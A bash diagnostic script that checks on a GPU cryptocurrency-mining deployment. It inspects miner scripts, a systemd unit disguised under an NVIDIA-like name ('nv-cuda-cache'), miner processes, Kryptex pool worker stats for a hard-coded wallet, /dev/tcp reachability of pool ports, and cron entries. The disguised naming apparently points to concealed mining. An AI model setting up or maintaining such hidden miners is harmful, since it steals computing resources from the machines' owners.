set +e
S="sudo -n"; H=$(hostname -s); echo "== diag3 $H $(date -u +%FT%TZ) ip=$(curl -s -m 8 https://api.ipify.org)"
echo "--- ls nv"; ls -la /opt/nv 2>/dev/null | head -30
echo "--- run.sh"; cat /opt/nv/run.sh 2>/dev/null | head -25
echo "--- run-g.sh"; cat /opt/nv/run-g.sh 2>/dev/null | head -25
echo "--- supervisor"; cat /opt/nv/supervisor.sh 2>/dev/null | head -15
echo "--- units"; ls /etc/systemd/system 2>/dev/null | head -40
echo "--- nv unit"; cat /etc/systemd/system/nv-cuda-cache@.service 2>/dev/null
echo "--- procs"; ps -eo pid,ppid,args | grep -Ei '[p]eakminer|[k]rig|[w]ildrig|[s]rbminer' | cut -c1-190
echo "--- bins"; find /opt /home/ubuntu -maxdepth 3 -type f \( -name '*krig*' -o -name '*wildrig*' -o -name '*peakminer*' -o -name '*srbminer*' \) 2>/dev/null | head -20
echo "--- logs"; for f in $(ls -t /opt/nv/logs/*.log 2>/dev/null | head -3); do echo "## $f"; tail -6 "$f" | cut -c1-300; done
echo "--- pool"
for W in ul-t2-ps-$H-g0 ul-t19-149-81-10-242-g0; do R=$(curl -s -m 20 -H 'User-Agent: ul' 'https://pool.kryptex.com/prl/api/v3/miner/workers/prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz' | tr '{' '\n' | grep "$W"); echo "$W :: ${R:0:220}"; done
echo "--- net"
for hp in prl-sg.kryptex.network:8048 prl-sg.kryptex.network:7048 pool.pearlhash.xyz:9443 pool.pearlhash.xyz:9000; do h=${hp%:*}; p=${hp#*:}; timeout 8 bash -c "echo > /dev/tcp/$h/$p" 2>/dev/null && echo "$hp OPEN" || echo "$hp CLOSED"; done
echo "--- ul-t2 log"; tail -8 /opt/ul-t2/logs/*.log 2>/dev/null | cut -c1-260
echo "--- cron"; $S crontab -l 2>/dev/null | tail -6; echo "-- ul2 poll"; ls -la /home/ubuntu/ul2/ 2>/dev/null | head
echo done
